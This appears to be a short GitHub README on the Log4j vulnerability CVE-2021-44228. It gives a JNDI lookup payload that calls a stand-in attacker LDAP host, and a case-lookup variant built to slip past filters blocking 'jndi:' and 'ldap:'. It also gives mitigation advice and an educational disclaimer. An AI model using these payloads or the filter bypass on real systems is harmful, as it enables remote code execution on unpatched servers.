# 📝 Description
🐱‍💻 ✂️ 🤬 LOG4J Java exploit - A trick to bypass words blocking patches

**CVE-2021-44228** works on:

log4j: 2.0 <= Apache log4j <= 2.14.1

Java version already patched: 6u211+, 7u201+, 8u191+,  11.0.1+.

Simple attacker script (Possible RCE):


`${jndi:ldap://somesitehackerofhell.com/z}`

Many developers started to block phrases:
- "ldap:"
- "jndi:"
  
to secure applications.


However, tha attacker can bypass it by using lower or upper lookup:

`${${lower:j}ndi:${lower:l}${upper:d}a${upper:p}://somesitehackerofhell.com/z}`

**Lower Lookup**
The LowerLookup converts the passed in argument to lower case. Presumably the value will be the
result of a nested lookup.


`${lower:<text>}`


**Upper Lookup**
The UpperLookup converts the passed in argument to upper case. Presumably the value will be the
result of a nested lookup.


`${upper:<text>}`

I am not an author of the bypass or CVE-2021-44228

# ✨ Best solution to protect from CVE-2021-44228
Start your server with `log4j2.formatMsgNoLookups` set to `true`, or update to `log4j-2.15.0-rc1` or later.

Keep it safe!

# 🤝 Show your support

**Give a ⭐️ if you liked the content**

# 📝 Useful links
- [Apache Log4j 2 v. 2.15.0 - User's Guide](https://logging.apache.org/log4j/2.x/log4j-users-guide.pdf)
- [Possible first publication of bypass](https://twitter.com/stereotype32/status/1469313856229228544)

# ✔️ Disclaimer
This project can only be used for educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.